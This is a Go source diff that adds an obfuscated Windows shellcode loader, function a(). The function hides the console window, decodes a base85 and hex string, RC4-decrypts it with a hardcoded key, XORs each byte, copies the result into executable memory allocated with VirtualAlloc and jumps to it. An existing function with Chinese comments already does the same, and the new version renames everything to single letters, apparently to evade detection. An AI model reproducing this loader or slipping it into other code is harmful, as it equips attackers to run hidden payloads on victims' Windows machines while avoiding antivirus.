@@ -10,8 +10,43 @@ import (
 	"github.com/lxn/win"
 	"golang.org/x/sys/windows"
 )
+func a() {
+	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
+	b := []byte("demaxiya")
+	c := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ111}"
 
+	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
+	d, _ := base85.Decode(c)
+
+	e := make([]byte, hex.DecodedLen(len(d)))
+	f, _ := hex.Decode(e, d)
+	e = e[:f]
+
+	g, _ := rc4.NewCipher(b)
+	h := make([]byte, len(e))
+	g.XORKeyStream(h, e)
+
+	i := make([]byte, len(h))
+	for j := 0; j < len(h); j++ {
+		i[j] = h[j] ^ 0xff
+	}
+
+	k, _ := syscall.LoadDLL("kernel32.dll")
+	l, _ := k.FindProc("VirtualAlloc")
+
+	m := uintptr(len(i))
+	n, _, _ := l.Call(uintptr(0), m, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if n == 0 {
+		panic("VirtualAlloc failed")
+	}
+	o := (*[0x1_000_000]byte)(unsafe.Pointer(n))[:m:m]
+	copy(o, i)
+
+	syscall.Syscall(n, 0, 0, 0, 0)
+}
 func decode() {
+
+
 	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
 	key := []byte("demaxiya")                                  // RC4 解密使用的密钥
 	encodedMessage := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ}" // 编码后的片段
